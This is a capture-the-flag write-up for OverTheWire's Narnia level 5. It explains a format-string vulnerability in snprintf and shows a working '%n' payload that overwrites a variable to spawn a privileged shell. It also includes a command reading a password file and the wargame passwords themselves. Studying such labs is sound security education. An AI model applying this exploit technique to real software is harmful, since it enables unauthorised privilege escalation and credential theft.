# Narnia Level 05 to 06

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Narnia |
| Level | 5 -> 6 |
| Status | Complete |

## Objective

Exploit the format-string bug in `narnia5` to change local variable `i` from `1` to `500`, trigger the privileged shell path, and recover `narnia6`.

## Given Access

User: `narnia5`

Password:

```text
Ni3xHPEuuw
```

## Recon

`/narnia/narnia5.c` does:

- `char buffer[64];`
- `int i = 1;`
- `snprintf(buffer, sizeof buffer, argv[1]);`
- spawns `/bin/sh` as the next user if `i == 500`

The bug is the user-controlled format string passed directly into `snprintf()`.

A quick stack probe with:

```bash
/narnia/narnia5 AAAA.%x.%x.%x.%x.%x.%x.%x.%x
```

showed that our input sits directly in the format-string argument stream, and the program itself leaked the current `&i` address.

## Exploit Strategy

1. Run a same-length probe to get the live `&i` value for the real payload size.
2. Put that address at the start of the format string.
3. Use `%n` to write decimal `500` (`0x1f4`) into `i`.
4. Feed commands to the spawned shell over stdin.

For the working payload length in this session, `i` was at:

```text
0xffffd3a0
```

Because the raw 4-byte address is printed before `%n`, the final working write used `496` more characters.

## Working Exploit

```bash
PAY=$(python3 -c 'import sys,struct;sys.stdout.buffer.write(struct.pack("<I",0xffffd3a0)+b"%496c%1$n")')
/narnia/narnia5 "$PAY"
```

This produced:

```text
Change i's value from 1 -> 500. GOOD
```

Then the spawned shell was used to recover the next password:

```bash
cat /etc/narnia_pass/narnia6
```

## Password

```text
BNSjoSDeGL
```

## Notes

- The live `&i` address is sensitive to argv length, so the probe needs to match the real payload length.
- `%1$n` worked because the first stack value consumed by the format string was the 4-byte address we injected at the beginning of the argument.

## References

- https://overthewire.org/wargames/narnia/
